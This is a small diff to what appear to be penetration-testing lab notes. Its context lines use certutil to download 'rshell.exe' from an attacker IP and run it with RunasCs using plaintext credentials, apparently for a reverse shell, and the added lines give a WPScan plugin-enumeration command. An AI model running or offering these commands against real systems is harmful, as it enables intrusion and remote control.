@@ -73,3 +73,9 @@ PS C:\tools> certutil.exe -urlcache -split -f "http://192.168.45.184/rshell.exe"
 CertUtil: -URLCache command completed successfully.
 PS C:\tools> .\RunasCs.exe svc_mssql trustno1 "cmd /c c:\tools\rshell.exe"
 ````
+
+### WPSCAN 
+
+```
+wpscan --update --url http://192.168.169.167/ --enumerate ap --plugins-detection aggressive
+```
